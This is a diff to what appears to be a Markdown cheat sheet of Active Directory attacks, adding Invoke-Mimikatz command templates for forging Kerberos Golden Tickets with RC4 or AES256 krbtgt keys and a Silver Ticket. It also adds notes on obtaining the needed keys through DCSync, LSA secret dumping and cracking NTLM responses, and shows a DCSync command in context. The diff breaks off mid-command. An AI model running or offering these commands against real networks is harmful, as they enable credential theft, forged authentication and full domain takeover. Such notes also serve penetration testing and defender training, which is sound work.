@@ -25,13 +25,23 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
 ```
 ### Golden Ticket
 ---
+ Need to find the krbtgt's RC4 or AES key. This can be achieved with DA privileges through a DCSync attack.
 ```powershell
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
                                          /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 
                                          /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
+                                         /sid:<domain_sid> /rc4:<krbtgt_hash> /id:500 
+                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+                                         
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
+                                         /sid:<domain_sid> /aes256:<krbtgt_hash> /id:500 
+                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'                                         
 ```
 ### Silver Ticket
 ---
+In order to craft a silver ticket, need to find the target service account's RC4 key or AES key. This can be done by capture an NTLM response (preferably NTLMv1) and cracking it, by dumping LSA secrets, doing a dcsync, etc...
 ```powershell
 # Get Privileges to access HOST service as Administrator con host
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
